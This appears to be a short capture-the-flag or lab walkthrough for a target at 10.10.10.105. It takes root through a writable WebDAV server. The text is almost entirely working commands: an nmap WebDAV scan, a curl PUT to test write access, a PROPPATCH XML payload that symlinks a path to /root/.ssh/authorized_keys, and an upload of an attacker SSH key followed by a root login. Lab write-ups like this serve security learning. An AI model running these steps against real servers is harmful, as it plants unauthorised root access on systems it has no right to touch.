WebDAV enabled with write access, symlink leads to root SSH key.

### Initial Discovery
```
# Nmap shows WebDAV
nmap -p 80 --script http-webdav-scan 10.10.10.105
# WebDAV enabled

# Test write access
curl -X PUT http://10.10.10.105/test.txt -d "test"
# HTTP/1.1 201 Created

# WebDAV is writable!
```

#### Create Symlink
```
# Upload malicious XML for symlink
cat > put.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<D:propertyupdate xmlns:D="DAV:">
  <D:set>
    <D:prop>
      <symlink xmlns="http://apache.org/dav/props/">
        <D:linktarget>
          <D:href>/root/.ssh/authorized_keys</D:href>
        </D:linktarget>
      </symlink>
    </D:prop>
  </D:set>
</D:propertyupdate>
EOF

# Apply symlink property
curl -X PROPPATCH -H "Content-Type: text/xml" --data-binary @put.xml http://10.10.10.105/ssh

# Now /ssh points to /root/.ssh/authorized_keys
```

#### Upload SSH Key
```
# Generate SSH key
ssh-keygen -t rsa -b 4096 -f webdav_key -N ""

# Upload public key
curl -X PUT http://10.10.10.105/ssh --data-binary @webdav_key.pub
# Writes to /root/.ssh/authorized_keys!

# SSH as root
ssh -i webdav_key root@10.10.10.105
# Root access!
```

